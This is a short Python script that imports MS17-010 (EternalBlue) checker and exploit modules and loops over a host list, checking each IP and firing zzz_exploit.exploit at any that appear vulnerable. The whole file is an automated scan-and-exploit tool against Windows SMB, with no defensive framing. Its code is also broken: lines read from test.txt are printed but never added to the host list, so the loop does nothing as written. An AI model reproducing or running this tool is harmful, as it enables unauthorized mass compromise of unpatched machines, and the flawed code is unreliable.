from MS17_010 import checker
from MS17_010 import zzz_exploit

# Get all active hosts
allActiveHosts = []
try:
    for line in open("test.txt"):
        line = line.split(" ")
        print(line)
except:
    print("No file to read exit(-1)")
    exit(-1)

def scan_for_ms17010():
    for ip in allActiveHosts:
        if checker.check(ip):
            zzz_exploit.exploit(ip,None)
            print(ip)
        else:
            print("NOPE")

def main():
    scan_for_ms17010()

main()
